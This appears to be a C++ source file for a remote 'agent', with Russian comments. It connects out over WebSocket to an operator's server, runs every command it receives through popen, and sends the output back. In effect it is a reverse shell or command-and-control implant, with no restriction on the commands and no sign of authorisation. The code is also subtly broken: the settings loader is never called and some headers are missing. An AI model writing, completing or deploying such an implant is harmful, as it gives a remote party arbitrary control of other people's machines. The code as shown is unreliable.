#include <iostream>
#include <string>
#include <cstdio>
#include "httplib.h"
#include "json.hpp"

using namespace std;
using json = nlohmann::json;
map <string,string> settings;
void readSettings(){

    string line, key;
    ifstream file("../settings.txt");
    if (!file.is_open())
    {}
 while (getline(file, line)){
        if (line.empty() || line[0] == '*')
            continue; // skip empty lines
        if (line[0] == '#'){
            key = line.substr(1);
            continue;
        }
        settings[key] = line;
        }
}


int main() {
    // Агент сам стучится на сервер
    httplib::ws::WebSocketClient ws(settings["server_adress"]); // <-- Твой IP сервера
    if (!ws.connect()) return 1;

    string msg;
    while (ws.read(msg)) {
        json req = json::parse(msg);
        string cmd = req["command"];
        
        // Выполняем
        FILE* p = popen((cmd + " 2>&1").c_str(), "r");
        string out;
        char buf[4096];
        while (fgets(buf, sizeof(buf), p)) out += buf;
        pclose(p);
        
        // Отдаем обратно
        ws.send(json{{"output", out}}.dump());
    }
    return 0;
}